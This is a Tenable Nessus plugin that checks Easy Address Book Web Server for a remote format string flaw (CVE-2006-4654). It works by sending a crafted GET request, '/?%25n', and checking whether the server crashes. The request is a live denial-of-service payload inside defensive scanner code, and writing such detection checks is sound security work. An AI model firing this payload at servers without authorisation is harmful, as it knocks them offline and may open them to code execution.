#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(22305);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2006-4654");
  script_bugtraq_id(19842);
  script_xref(name:"OSVDB", value:"28945");

  script_name(english:"Easy Address Book Web Server Query Remote Format String");
  script_summary(english:"Tries to crash Easy Address Book Web Server");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a format string vulnerability." );
 script_set_attribute(attribute:"description", value:
"It appears that the remote web server is affected by a remote format
string issue.  Using a specially-crafted URL containing a format
string specifier, an unauthenticated remote attacker can crash the
affected application and possibly execute arbitrary code on the remote
host." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/445262/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_DENIAL);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);


# Make sure it looks like Easy Address Book Web Server.
banner = get_http_banner(port:port);
if (!banner || "Server: Easy Address Book Web Server" >!< banner) exit(0);

# Try to exploit the flaw to crash the server.
if (http_is_dead(port:port)) exit(0);

r = http_send_recv3(method:"GET",item:"/?%25n", port:port);

# There's a problem if the server is now down.
sleep(1);
if (http_is_dead(port:port)) security_warning(port);
